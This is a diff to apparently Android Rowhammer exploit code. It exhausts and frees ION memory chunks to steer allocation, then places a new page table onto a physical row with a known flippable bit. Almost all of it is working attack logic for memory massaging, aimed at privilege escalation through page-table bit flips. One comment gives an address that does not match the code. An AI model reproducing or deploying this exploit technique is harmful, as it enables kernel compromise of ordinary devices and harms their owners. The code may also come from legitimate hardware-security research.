@@ -152,15 +152,16 @@ int main(int argc, char *argv[]) {
         uint32_t length = K(4);
         uint32_t count = 128*4;
         uint32_t free_before[11], free_mid[11], free_after[11];
-//        get_maps_info();
+        get_maps_info();
         get_buddy_info("Normal", free_before);
-//        get_status_info("VmPTE");
+        get_status_info("VmPTE");
         for (uint32_t i = 0; i < count; i++) {
             mmap(p, length, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
             uint8_t *q = p;
             *q = 0xFF;
             p = p + interval;
 //            get_buddy_info("Normal");
+//            // get_status_info affects page allocation stability. Only used when observing.
 //            get_status_info("VmPTE");
         }
         get_buddy_info("Normal", free_mid);
@@ -313,10 +314,11 @@ int main(int argc, char *argv[]) {
             }
             run_cnt++;
             get_buddy_info();
+            
             // Exhaust L
-            printf("[MAIN] Exhaust L (4MB) ION chunks for templating\n");
+            printf("[EXHAUST L] Exhaust L (4MB) ION chunks for templating\n");
             int count = ION_bulk(M(4), ion_chunks, 0);
-            print("[EXHAUST] %d L (4MB) ION chunks allocated \n", count);
+            print("[EXHAUST L] %d L (4MB) ION chunks allocated \n", count);
             get_buddy_info();
 
             // Template L
@@ -330,25 +332,24 @@ int main(int argc, char *argv[]) {
             }
 
             // Exhaust M
-            printf("[MAIN] Exhaust M (64KB) ION chunks\n");
+            printf("[EXHAUST M] Exhaust M (64KB) ION chunks\n");
             count = ION_bulk(K(64), ion_chunks, 0, false);
-            print("[EXHAUST] %d M (64KB) ION chunks allocated \n", count);
+            print("[EXHAUST M] %d M (64KB) ION chunks allocated \n", count);
             get_buddy_info();
 
             // Free L* with particular exploitable bit
-            print("[MAIN] Free L* at va %p\n", first_expl->ion_chunk->mapping);
-            print("[MAIN] Exploitable bit at va %p\n", first_expl->virt_addr);
-            uintptr_t expl_row = first_expl->virt_addr & 0xffff0000;
-            if (expl_row == (uintptr_t)first_expl->ion_chunk->mapping) {
-                printf("[TMPL] - M* at edge of L*\n");
+            print("[FREE L] Free L* at va %p\n", first_expl->ion_chunk->mapping);
+            print("[FREE L] Exploitable bit at va %p\n", first_expl->virt_addr);
+            if (first_expl->virt_row == (uintptr_t)first_expl->ion_chunk->mapping) {
+                printf("[FREE L] - M* at edge of L*\n");
                 continue;
             }
             ION_clean(first_expl->ion_chunk);
 
             // Immediately exhaust M again
-            printf("[MAIN] Exhaust M (64KB) ION chunks again\n");
+            printf("[EXHAUST M] Exhaust M (64KB) ION chunks again\n");
             count = ION_bulk(K(64), ion_chunks, 0);
-            print("[EXHAUST] %d M (64KB) ION chunks allocated \n", count);
+            print("[EXHAUST M] %d M (64KB) ION chunks allocated \n", count);
             if (count != 64) {
                 // M doesn't use free space of L*
                 printf("[EXHAUST M] - size mismatch\n");
@@ -366,16 +367,16 @@ int main(int argc, char *argv[]) {
             bool addr_correct = false;
             for (auto chunk : ion_chunks) {
                 if (chunk->len == M(4)) {
-//                    print("[FREE] Free %p, len %d\n", chunk->mapping, chunk->len);
+//                    print("[FREE L] Free %p, len %d\n", chunk->mapping, chunk->len);
                     ION_clean(chunk);
-                } else if ((uintptr_t)chunk->mapping == expl_row) {
+                } else if ((uintptr_t)chunk->mapping == first_expl->virt_row) {
                     addr_correct = true;
-                    print("[FREE] Free %p, len %d\n", chunk->mapping, chunk->len);
+                    print("[FREE M] Free %p, len %d\n", chunk->mapping, chunk->len);
                     ION_clean(chunk);
                 }
             }
             if (!addr_correct) {
-                printf("[FREE] - M* address is not correct\n");
+                printf("[FREE M] - M* address is not correct\n");
                 continue;
             }
 
@@ -385,7 +386,7 @@ int main(int argc, char *argv[]) {
             uint32_t free[11];
             get_buddy_info("Normal", free);
             if (free[4] != 1) {
-                printf("[MAIN] More than one 64K holes\n");
+                printf("[EXHAUST S] More than one 64K holes\n");
                 continue;
             }
             while (true) {
@@ -394,12 +395,25 @@ int main(int argc, char *argv[]) {
 
                 get_buddy_info("Normal", free);
                 if (free[4] != 1) {
-                    printf("[EXHAUST] Meet 64K hole\n");
+                    printf("[EXHAUST S] Meet 64K hole\n");
                     break;
                 }
             }
 
             // Allocate padding S until the next place will be vulnerable
+            uint32_t padding_num = (first_expl->virt_page - first_expl->virt_row) / PAGESIZE;
+            printf("[PADDING] %#x, %#x\n", first_expl->virt_page, first_expl->virt_row);
+            printf("[PADDING] Padding %u pages\n", padding_num);
+            if (padding_num != 0) ION_bulk(K(4), ion_chunks, padding_num - 1,false);
+
+            // Map appropriate p to allocate a new page table
+            get_maps_info();
+            // Why 0xB6800000? See my script.
+            void *p = (void *)(0x14000000 | first_expl->word_index_in_pt << 12);
+            get_status_info("VmPTE");
+            void *q = mmap(p, K(4), PROT_READ | PROT_WRITE, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+            get_status_info("VmPTE");
+            printf("[MAP P] Map p at %p, got %p\n", p, q);
 
             break;
         } while(true);
